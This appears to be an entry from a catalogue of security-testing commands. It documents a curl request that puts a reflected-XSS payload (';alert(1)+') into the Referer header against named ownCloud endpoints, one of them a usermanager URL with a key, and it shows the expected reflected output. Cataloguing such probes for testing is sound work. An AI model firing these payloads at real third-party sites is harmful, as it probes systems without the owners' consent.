---
data: >-
  curl -H "Referer: http://www.myevilsite.com/qwe';alert(1)+'" -v
  https://apps.owncloud.com/messages/?action=newmessage&username=anderslund
tags:
  - http
  - xss
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:08.012Z'
id: 070541d0-09de-459d-8ae5-f27837f608a9
verified: false
validated: true
submitted: true
---
# curl-send-referer-xss

## Command

```bash
curl -H "Referer: http://www.myevilsite.com/qwe';alert(1)+'" -v https://apps.owncloud.com/messages/?action=newmessage&username=anderslund
```

## Description

This command uses curl to send a GET request to a vulnerable ownCloud endpoint with a custom malicious Referer header, testing for XSS reflection. The -v flag enables verbose output to inspect headers and response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Adds a custom header (Referer with payload) | Yes |
| `-v` | Verbose mode for debugging | No |
| URL | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -H "Referer: http://example.com';alert(1)+'" https://target.com/vuln
```

### Advanced Usage

```bash
curl -H "Referer: $(cat payload.txt)" -v -o response.html https://apps.owncloud.com/usermanager/edit.php?key=55340976171888538576819077872339
```

## Expected Output

Verbose logs showing request headers, followed by HTML response with reflected Referer in onclick, e.g., onclick="location.href='http://www.myevilsite.com/qwe';alert(1)+'...'. No errors if successful.

## Related

- [[Related Procedure: Send-Request-to-Vulnerable-ownCloud-Endpoint]]
